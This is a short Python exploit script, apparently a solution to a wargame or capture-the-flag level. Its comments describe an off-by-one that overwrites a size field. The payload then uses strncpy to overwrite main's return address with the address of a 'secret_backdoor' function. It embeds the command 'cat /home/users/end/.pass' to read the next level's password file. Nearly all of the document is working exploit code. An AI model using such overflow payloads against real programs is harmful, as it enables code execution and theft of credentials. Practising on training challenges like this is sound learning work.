import struct
# while (i <= 0x28 && b[i])
# is off by one so it overwrites the size.
# strncpy(info->msg, b, info->size);
# then use the strncpy to copy the addr of
# secret_backdoor to the main's return.

# len(in2) = 0xd0
padd = 'a'*0x28
in1 = padd + '\xd0' + '\n'

# trial and error
padd = 'a'*0x48
padd += 'cat /home/users/end/.pass '
padd += 'b'*(0xc0 - len(padd) + 8)
secret_backdoor_addr = 0x000055555555488c
in2 = padd + struct.pack("<q", secret_backdoor_addr)

print in1 + in2
